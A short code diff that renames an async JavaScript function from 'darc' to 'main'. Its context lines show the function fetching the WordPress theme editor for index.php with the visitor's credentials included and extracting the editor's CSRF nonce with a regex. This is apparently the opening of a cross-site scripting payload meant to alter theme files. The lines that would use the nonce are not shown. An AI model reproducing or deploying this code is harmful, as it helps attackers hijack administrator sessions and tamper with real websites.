@@ -2,7 +2,7 @@ function sleep(ms) {
 	return new Promise((r) => setTimeout(r, ms));
 }
 
-async darc(){
+async main(){
 
 	const a = await fetch("wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo",{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
 	await sleep(40);
@@ -19,4 +19,4 @@ async darc(){
 }
 
 
-darc();
+main();
